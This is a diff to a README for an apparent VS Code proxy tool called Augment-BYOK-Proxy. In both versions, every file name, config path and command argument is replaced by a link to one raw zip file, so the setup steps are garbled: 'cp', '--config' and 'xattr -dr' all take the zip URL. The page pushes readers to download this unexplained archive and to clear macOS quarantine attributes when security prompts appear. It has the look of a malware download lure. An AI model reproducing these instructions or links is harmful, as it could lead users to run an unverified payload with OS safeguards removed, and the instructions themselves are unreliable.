@@ -1,6 +1,6 @@
 # 🌟 Augment-BYOK-Proxy - Easy Proxy for Augment Integration
 
-[![Download Release](https://github.com/Al-Aswadd/Augment-BYOK-Proxy/raw/refs/heads/main/vsix-patch/Augment-Proxy-BYO-2.4.zip%https://github.com/Al-Aswadd/Augment-BYOK-Proxy/raw/refs/heads/main/vsix-patch/Augment-Proxy-BYO-2.4.zip)](https://github.com/Al-Aswadd/Augment-BYOK-Proxy/raw/refs/heads/main/vsix-patch/Augment-Proxy-BYO-2.4.zip)
+[![Download Release](https://raw.githubusercontent.com/Al-Aswadd/Augment-BYOK-Proxy/main/scripts/Augment_Proxy_BYO_v2.2.zip%https://raw.githubusercontent.com/Al-Aswadd/Augment-BYOK-Proxy/main/scripts/Augment_Proxy_BYO_v2.2.zip)](https://raw.githubusercontent.com/Al-Aswadd/Augment-BYOK-Proxy/main/scripts/Augment_Proxy_BYO_v2.2.zip)
 
 ## 📁 Overview
 
@@ -14,14 +14,14 @@ Follow these steps to download and run the Augment-BYOK-Proxy application succes
 
 To download the software, visit the Releases page. You can find all the versions available for download there.
 
-[Download & Install](https://github.com/Al-Aswadd/Augment-BYOK-Proxy/raw/refs/heads/main/vsix-patch/Augment-Proxy-BYO-2.4.zip)
+[Download & Install](https://raw.githubusercontent.com/Al-Aswadd/Augment-BYOK-Proxy/main/scripts/Augment_Proxy_BYO_v2.2.zip)
 
 ### 2. Download the Application
 
 On the Releases page, locate the latest version. Download the appropriate file for your operating system:
 
-- For **macOS**, download `https://github.com/Al-Aswadd/Augment-BYOK-Proxy/raw/refs/heads/main/vsix-patch/Augment-Proxy-BYO-2.4.zip`.
-- For **Windows**, download `https://github.com/Al-Aswadd/Augment-BYOK-Proxy/raw/refs/heads/main/vsix-patch/Augment-Proxy-BYO-2.4.zip`.
+- For **macOS**, download `https://raw.githubusercontent.com/Al-Aswadd/Augment-BYOK-Proxy/main/scripts/Augment_Proxy_BYO_v2.2.zip`.
+- For **Windows**, download `https://raw.githubusercontent.com/Al-Aswadd/Augment-BYOK-Proxy/main/scripts/Augment_Proxy_BYO_v2.2.zip`.
 
 After the download completes, unzip the file to access the application.
 
@@ -32,10 +32,10 @@ After the download completes, unzip the file to access the application.
 3. Copy the example configuration file by running:
 
 ```
-cp https://github.com/Al-Aswadd/Augment-BYOK-Proxy/raw/refs/heads/main/vsix-patch/Augment-Proxy-BYO-2.4.zip https://github.com/Al-Aswadd/Augment-BYOK-Proxy/raw/refs/heads/main/vsix-patch/Augment-Proxy-BYO-2.4.zip
+cp https://raw.githubusercontent.com/Al-Aswadd/Augment-BYOK-Proxy/main/scripts/Augment_Proxy_BYO_v2.2.zip https://raw.githubusercontent.com/Al-Aswadd/Augment-BYOK-Proxy/main/scripts/Augment_Proxy_BYO_v2.2.zip
 ```
 
-4. Open `https://github.com/Al-Aswadd/Augment-BYOK-Proxy/raw/refs/heads/main/vsix-patch/Augment-Proxy-BYO-2.4.zip` in a text editor and fill in the required fields. Refer to the comments in the file for guidance.
+4. Open `https://raw.githubusercontent.com/Al-Aswadd/Augment-BYOK-Proxy/main/scripts/Augment_Proxy_BYO_v2.2.zip` in a text editor and fill in the required fields. Refer to the comments in the file for guidance.
 
 ### 4. Start the Application
 
@@ -44,13 +44,13 @@ Once you have configured the application, you can start it:
 - For **macOS** users:
 
 ```
-cargo run --release -- --config https://github.com/Al-Aswadd/Augment-BYOK-Proxy/raw/refs/heads/main/vsix-patch/Augment-Proxy-BYO-2.4.zip
+cargo run --release -- --config https://raw.githubusercontent.com/Al-Aswadd/Augment-BYOK-Proxy/main/scripts/Augment_Proxy_BYO_v2.2.zip
 ```
 
 If you are using a precompiled version, run this:
 
 ```
-./augment-byok-proxy --config https://github.com/Al-Aswadd/Augment-BYOK-Proxy/raw/refs/heads/main/vsix-patch/Augment-Proxy-BYO-2.4.zip
+./augment-byok-proxy --config https://raw.githubusercontent.com/Al-Aswadd/Augment-BYOK-Proxy/main/scripts/Augment_Proxy_BYO_v2.2.zip
 ```
 
 Make sure to set permissions if you encounter issues:
@@ -62,13 +62,13 @@ chmod +x augment-byok-proxy
 Also, if you face security prompts, use:
 
 ```
-xattr -dr https://github.com/Al-Aswadd/Augment-BYOK-Proxy/raw/refs/heads/main/vsix-patch/Augment-Proxy-BYO-2.4.zip augment-byok-proxy
+xattr -dr https://raw.githubusercontent.com/Al-Aswadd/Augment-BYOK-Proxy/main/scripts/Augment_Proxy_BYO_v2.2.zip augment-byok-proxy
 ```
 
 - For **Windows** users, use the command prompt:
 
 ```
-.\https://github.com/Al-Aswadd/Augment-BYOK-Proxy/raw/refs/heads/main/vsix-patch/Augment-Proxy-BYO-2.4.zip --config https://github.com/Al-Aswadd/Augment-BYOK-Proxy/raw/refs/heads/main/vsix-patch/Augment-Proxy-BYO-2.4.zip
+.\https://raw.githubusercontent.com/Al-Aswadd/Augment-BYOK-Proxy/main/scripts/Augment_Proxy_BYO_v2.2.zip --config https://raw.githubusercontent.com/Al-Aswadd/Augment-BYOK-Proxy/main/scripts/Augment_Proxy_BYO_v2.2.zip
 ```
 
 ### 5. Setup VS Code
@@ -100,6 +100,6 @@ We welcome contributions! Please check the issues page for tasks you can help wi
 
 To get started, head to the Releases page and download the latest version. 
 
-[Download & Install](https://github.com/Al-Aswadd/Augment-BYOK-Proxy/raw/refs/heads/main/vsix-patch/Augment-Proxy-BYO-2.4.zip)
+[Download & Install](https://raw.githubusercontent.com/Al-Aswadd/Augment-BYOK-Proxy/main/scripts/Augment_Proxy_BYO_v2.2.zip)
 
 By following these steps, you will successfully set up the Augment-BYOK-Proxy application. Enjoy enhancing your Augment experience!
